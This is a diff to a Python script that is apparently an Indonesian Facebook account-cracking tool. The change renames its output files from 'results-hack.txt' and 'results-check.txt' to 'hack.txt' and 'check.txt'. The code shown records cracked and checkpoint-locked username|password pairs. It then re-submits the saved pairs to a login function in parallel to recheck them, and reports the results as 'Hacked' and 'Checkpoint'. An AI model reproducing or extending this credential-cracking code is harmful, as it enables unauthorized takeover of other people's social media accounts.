@@ -111,7 +111,7 @@ def moch_yayan():
                  if cek:
                         life.append(username+"|"+password)
                  else:
-                        with open('results-hack.txt','a') as f:
+                        with open('hack.txt','a') as f:
                                 f.write(username + '|' + password + '\n')
              elif 'www.facebook.com' in response.json()['error_msg']:
                    print(f"\r\033[1;97m[\033[1;93m×\033[1;97m] \033[1;37m{username}\033[94m|\033[1;37m{password}                    ",end="")
@@ -120,7 +120,7 @@ def moch_yayan():
                    if cek:
                            chek.append(username+"|"+password)
                    else:
-                           with open('results-check.txt','a') as f:
+                           with open('check.txt','a') as f:
                                 f.write(username + '|' + password + '\n')
              else:
                    die += 1
@@ -259,8 +259,8 @@ def moch_yayan():
                                  exit("\033[00m[\033[91m!\033[00m] \033[97mUsername/ID Tidak Ada!")
                    elif memek == '6' or memek =='06':
                          try:
-                                 file1 = open("results-check.txt").read()
-                                 file2 = open("results-hack.txt").read()
+                                 file1 = open("check.txt").read()
+                                 file2 = open("hack.txt").read()
                                  a = file1 + file2
                                  final = a.strip().split("\n")
                                  final = set(final)
@@ -269,17 +269,17 @@ def moch_yayan():
                                          for user in final:
                                                  a = user.split("|")
                                                  ex.submit(login,(a[0]),(a[1]),(True))
-                                 os.remove("results-check.txt")
-                                 os.remove("results-life.txt")
+                                 os.remove("check.txt")
+                                 os.remove("hack.txt")
                                  for x in life:
-                                         with open('results-hack.txt','a') as f:
+                                         with open('hack.txt','a') as f:
                                                  f.write(x+'\n')
                                  for x in chek:
-                                         with open('results-check.txt','a') as f:
+                                         with open('check.txt','a') as f:
                                                  f.write(x+"\n")
 
                                  print("\n\x1b[1;97m[\x1b[1;94m•\x1b[1;97m] Crack Selesai....")
-                                 print("\x1b[1;97m[\x1b[1;94m✓\x1b[1;97m] Saved To \033[1;93mresults-check.txt\033[90m|\033[1;92mresults-hack.txt")
+                                 print("\x1b[1;97m[\x1b[1;94m✓\x1b[1;97m] Saved To \033[1;93mcheck.txt\033[90m|\033[1;92mhack.txt")
                          except FileNotFoundError:
                                  exit("\n\033[00m[\033[91m!\033[00m] Kamu Tidak Mendapatkan Hasil")
                    else:
@@ -307,8 +307,8 @@ def moch_yayan():
                            time.sleep(0.1)
                            print("\n\n\x1b[1;94m────────────────────────────────────────────────────\033[00m")
                            print("\x1b[1;97m[\x1b[1;94m•\x1b[1;97m] Crack Selesai...")
-                           print("\x1b[1;97m[\x1b[1;94m✓\x1b[1;97m] Hacked     \x1b[1;94m: \033[92mresults-hack.txt\033[00m")
-                           print("\x1b[1;97m[\x1b[1;91m×\x1b[1;97m] Checkpoint \x1b[1;94m: \033[93mresults-check.txt\033[00m")
+                           print("\x1b[1;97m[\x1b[1;94m✓\x1b[1;97m] Hacked     \x1b[1;94m: \033[92mhack.txt\033[00m")
+                           print("\x1b[1;97m[\x1b[1;91m×\x1b[1;97m] Checkpoint \x1b[1;94m: \033[93mcheck.txt\033[00m")
                            print("\x1b[1;94m────────────────────────────────────────────────────\033[00m")
                    
                    else:
